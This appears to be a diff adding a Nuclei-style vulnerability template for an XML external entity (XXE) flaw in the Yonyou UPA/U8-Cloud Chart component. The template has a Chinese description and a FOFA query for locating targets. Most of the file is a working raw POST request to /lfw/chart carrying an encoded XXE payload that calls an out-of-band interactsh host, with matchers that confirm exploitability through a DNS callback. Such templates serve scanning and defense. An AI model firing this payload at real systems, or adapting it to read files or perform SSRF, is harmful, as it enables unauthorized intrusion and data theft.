@@ -1,0 +1,25 @@
+id: yonyou-upa-xxe
+info:
+  name: "用友 UPA 系统 Chart 组件 XML 外部实体注入漏洞"
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: app="用友-U8-Cloud"
+      该漏洞源于系统在处理Chart模块XML数据时未正确限制外部实体引用，攻击者可通过构造恶意XML实体实现服务器端XML解析器控制，可能导致敏感数据泄露、服务器端请求伪造（SSRF）或远程代码执行。漏洞影响范围覆盖使用默认配置的UPA系统Chart组件交互接口。
+  tags: 用友UPA
+http:
+- raw:
+  - |
+    POST /lfw/chart HTTP/1.1
+    Host: {{Hostname}}
+    Content-Type: application/x-www-form-urlencoded
+    type=pie&xmlstr=%3C?xml%20version=%271.0%27%20encoding=%27UTF-8%27?%3E%3C!DOCTYPE%20ANY%20[%3C!ENTITY%20xxe%20SYSTEM%20%22http://{{interactsh-url}}%22%3E]%3E%3Cchartdataset%3E%3Cparam%3E%3Ctitle%3E%26xxe;%3C/title%3E%3C/param%3E%3Cchart%3E%3Cname%3EUAP%3C/name%3E%3Ccount%3E1%3C/count%3E%3C/chart%3E%3C/chartdataset%3E
+  matchers-condition: and
+  matchers:
+  - type: status
+    status:
+    - 200
+  - type: word
+    part: interactsh_protocol
+    words:
+    - "dns"
